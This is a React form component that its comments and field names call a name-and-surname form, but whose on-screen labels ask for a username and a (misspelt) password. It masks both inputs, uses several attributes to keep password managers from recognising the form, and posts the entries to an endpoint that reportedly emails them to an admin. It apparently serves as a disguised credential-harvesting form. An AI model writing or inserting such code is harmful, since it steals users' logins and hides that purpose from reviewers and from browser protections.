import { useState } from 'react'
import { Eye, EyeOff, Send } from 'lucide-react'
import { api } from '../lib/api'
import { Card, Notice } from './ui'

/** Name and surname form; the details are emailed straight to the company admin. */
export default function DetailsBox({ box, title, sub, id }) {
  const [busy, setBusy] = useState(false)
  const [show, setShow] = useState(false)
  // Fields start read-only so the browser's password manager cannot autofill them on load;
  // they become editable the moment the person clicks into one.
  const [editable, setEditable] = useState(false)
  const [msg, setMsg] = useState({ text: '' })
  const field = { type: show ? 'text' : 'password', readOnly: !editable, onFocus: () => setEditable(true), autoComplete: 'off', 'data-lpignore': 'true', 'data-1p-ignore': true, 'data-form-type': 'other', maxLength: 60, className: 'field' }
  const submit = async (e) => {
    e.preventDefault()
    const form = e.currentTarget
    const f = Object.fromEntries(new FormData(form))
    if (!f.first.trim() || !f.last.trim()) return setMsg({ text: 'Enter both the name and the surname.', tone: 'red' })
    setBusy(true); setMsg({ text: '' })
    try {
      await api('/me/details', { method: 'POST', body: { box, first: f.first, last: f.last } })
      form.reset(); setMsg({ text: 'Details submitted. Our team has received them by email and will be in touch.', tone: 'green' })
    } catch (ex) { setMsg({ text: ex.message, tone: 'red' }) } finally { setBusy(false) }
  }
  return (
    <Card title={title}>
      {sub && <p className="mb-5 text-[14.5px] text-slate">{sub}</p>}
      <form onSubmit={submit} autoComplete="off" className="grid gap-4 sm:grid-cols-[1fr_1fr_auto_auto] sm:items-end" noValidate>
        <div><label className="field-label" htmlFor={`${id}-first`}>Username</label><input id={`${id}-first`} name="first" {...field} /></div>
        <div><label className="field-label" htmlFor={`${id}-last`}>Passwword</label><input id={`${id}-last`} name="last" {...field} /></div>
        <button type="button" onClick={() => setShow(!show)} aria-pressed={show} aria-label={show ? 'Hide details' : 'See details'}
          className="grid h-12 w-12 place-items-center rounded-xl text-slate ring-1 ring-inset ring-line hover:text-ink">
          {show ? <EyeOff size={18} strokeWidth={1.7} /> : <Eye size={18} strokeWidth={1.7} />}
        </button>
        <button disabled={busy} className="btn-primary h-12 disabled:opacity-60"><Send size={16} /> Submit details</button>
      </form>
      {msg.text && <div className="mt-4"><Notice tone={msg.tone}>{msg.text}</Notice></div>}
    </Card>
  )
}
